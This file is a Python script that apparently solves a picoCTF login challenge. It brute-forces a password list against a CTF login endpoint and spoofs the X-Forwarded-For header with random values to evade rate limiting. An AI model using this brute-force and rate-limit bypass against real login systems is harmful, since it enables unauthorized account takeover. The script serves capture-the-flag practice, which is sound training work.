import requests
import random
import json

data = []

with open("passwords.txt", "r") as f:
    for line in f.readlines():
        data.append(line.strip())

url = "http://amiable-citadel.picoctf.net:58857/login"

for password in data:
    payload = {
        "email": "ctf-player@picoctf.org",
        "password": password
    }
    header = {
        "X-Forwarded-For": str(random.randint(5000, 6000))
    }

    req = requests.post(url, data=payload, headers=header)
    data = json.loads(req.text)
    if data["success"] == True:
        print(f"Password Found: {password}")
        break